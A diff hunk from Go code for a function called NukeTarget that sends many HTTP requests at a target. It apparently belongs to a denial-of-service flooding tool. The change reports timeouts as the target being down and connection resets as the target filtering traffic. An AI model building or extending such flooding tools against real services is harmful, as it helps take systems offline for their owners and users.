@@ -54,14 +54,21 @@ func NukeTarget(client http.Client, amountSylos int, amountRequests int64) comma
 
 						resp, err := client.Do(req)
 
-						if errors.Is(err, io.EOF) ||
-							errors.Is(err, syscall.ECONNRESET) ||
-							errors.Is(err, context.DeadlineExceeded) ||
-							os.IsTimeout(err) {
+						if errors.Is(err, context.DeadlineExceeded) || os.IsTimeout(err) {
 							w.Write(command.E{
 								Type: "TARGET_DOWN",
 								P:    p,
 							})
+							return
+						}
+
+						if errors.Is(err, io.EOF) || errors.Is(err, syscall.ECONNRESET) {
+							w.Write(
+								command.NewErrEvent(
+									e,
+									errors.Wrap(err, "attac failed, target filters traffic"),
+								),
+							)
 							return
 						}
 
